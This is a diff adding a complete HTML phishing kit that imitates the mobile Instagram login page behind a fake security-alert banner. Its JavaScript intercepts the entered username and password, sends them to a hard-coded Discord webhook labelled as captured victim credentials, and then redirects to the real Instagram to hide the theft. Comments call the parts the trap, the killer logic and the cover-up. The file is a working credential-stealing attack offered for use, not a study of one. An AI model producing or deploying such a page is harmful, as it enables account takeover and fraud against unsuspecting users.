@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        /* 
+        =========================================================
+        CSS: THE VISUAL DECEPTION
+        =========================================================
+        This CSS makes the page look exactly like the mobile 
+        Instagram web login page. 
+        */
+        :root {
+            --ig-primary: #0095F6;
+            --ig-primary-hover: #0082d9;
+            --ig-border: #dbdbdb;
+            --ig-text: #262626;
+            --ig-text-light: #8e8e8e;
+            --ig-bg: #fafafa;
+            --ig-white: #ffffff;
+            --ig-error: #ff3040;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--ig-bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--ig-text);
+        }
+
+        /* The Main Card */
+        .login-container {
+            background-color: var(--ig-white);
+            border: 1px solid var(--ig-border);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 350px;
+            padding: 40px 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            margin: 20px;
+        }
+
+        /* Logo */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        /* Security Alert Banner */
+        .alert-banner {
+            background-color: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #5d4037;
+            line-height: 1.4;
+        }
+        .alert-banner strong {
+            color: #3e2723;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 12px;
+            border: 1px solid var(--ig-border);
+            border-radius: 8px;
+            font-size: 14px;
+            color: var(--ig-text);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .form-control:focus {
+            border-color: var(--ig-primary);
+        }
+
+        /* Button */
+        .btn-primary {
+            width: 100%;
+            background-color: var(--ig-primary);
+            color: var(--ig-white);
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+        .btn-primary:hover {
+            background-color: var(--ig-primary-hover);
+        }
+        .btn-primary:disabled {
+            background-color: #e4e6eb;
+            cursor: not-allowed;
+        }
+
+        /* Footer Links */
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            margin-top: 24px;
+            font-size: 12px;
+        }
+        .footer-links a {
+            color: var(--ig-primary);
+            text-decoration: none;
+        }
+
+        /* Spinner */
+        .spinner-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            margin-top: 24px;
+        }
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--ig-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Mobile Optimization */
+        @media (max-width: 480px) {
+            .login-container {
+                border: none;
+                box-shadow: none;
+                padding: 20px;
+                margin: 0;
+                max-width: 100%;
+            }
+            body {
+                background-color: var(--ig-white);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <!-- Using the official Instagram logo from their CDN -->
+            <img src="https://www.instagram.com/static/images/web/icons/svg/img_logo_100x100-2f90c40a1b587d8c92b5662a92a202a3.png" alt="Instagram" class="logo">
+        </div>
+
+        <!-- The Hook -->
+        <div class="alert-banner">
+            <strong>Security Alert:</strong> We detected unusual activity on your account. Please verify your identity to secure your account.
+        </div>
+
+        <!-- The Trap -->
+        <form id="phishForm" autocomplete="off">
+            <div class="form-group">
+                <input type="text" id="username" class="form-control" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" class="form-control" placeholder="Password" required>
+            </div>
+            
+            <button type="submit" id="submitBtn" class="btn-primary">Log in</button>
+        </form>
+
+        <!-- Loading State -->
+        <div class="spinner-container" id="spinner">
+            <div class="spinner"></div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-links">
+            <a href="#" onclick="return false;">Need help?</a>
+        </div>
+    </div>
+
+    <script>
+        /* 
+        =========================================================
+        JAVASCRIPT: THE KILLER LOGIC
+        =========================================================
+        This script does three things:
+        1. Intercepts the form submission.
+        2. Sends the data to your Discord Webhook.
+        3. Redirects the victim to the real Instagram to avoid suspicion.
+        */
+
+        // 1. CONFIGURATION
+        // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567574135905722478/iiHYXHQuopPMGeife1ap2HLK3T2RvHY2ZSeBPZ_q2kFglvz0qS0_fcgDjQV2FulUGYGs";
+
+        // 2. DOM ELEMENTS
+        const form = document.getElementById('phishForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinner');
+
+        // 3. EVENT LISTENER
+        form.addEventListener('submit', async function(event) {
+            // Prevent the browser from doing a traditional form submission
+            event.preventDefault();
+
+            // Get the values
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+
+            // Basic validation
+            if (!username || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            // UI State: Show spinner, disable button
+            submitBtn.style.display = 'none';
+            spinner.style.display = 'flex';
+            submitBtn.disabled = true;
+
+            try {
+                // 4. THE TRANSMISSION
+                // Send the data to Discord
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        // This sets the bot name in Discord
+                        username: "Instagram Security Bot",
+                        // This is the actual message content
+                        embeds: [{
+                            title: "🚨 NEW CREDENTIAL CAPTURED",
+                            description: "A new victim has fallen for the Instagram phishing kit.",
+                            color: 15158332, // Red color (0xE74C3C in hex)
+                            fields: [
+                                {
+                                    name: "Username",
+                                    value: username,
+                                    inline: true
+                                },
+                                {
+                                    name: "Password",
+                                    value: password,
+                                    inline: true
+                                },
+                                {
+                                    name: "Timestamp",
+                                    value: new Date().toLocaleString(),
+                                    inline: false
+                                }
+                            ],
+                            footer: {
+                                text: "Source: PhishKit v1.0"
+                            }
+                        }]
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                // 5. THE COVER-UP
+                // Wait 2.5 seconds to mimic a real login delay
+                setTimeout(() => {
+                    // Redirect to the real Instagram
+                    window.location.href = 'https://www.instagram.com/';
+                }, 2500);
+
+            } catch (error) {
+                console.error('Phish submission error:', error);
+                // If the Discord webhook fails, show an error to the user
+                // (In a real attack, you might want to silently fail here)
+                alert('Something went wrong. Please try again.');
+                submitBtn.style.display = 'block';
+                spinner.style.display = 'none';
+                submitBtn.disabled = false;
+            }
+        });
+
+        // 6. EXTRA: AUTO-FOCUS
+        // Automatically focus on the username field when the page loads
+        window.addEventListener('load', () => {
+            usernameInput.focus();
+        });
+    </script>
+
+</body>
+</html>
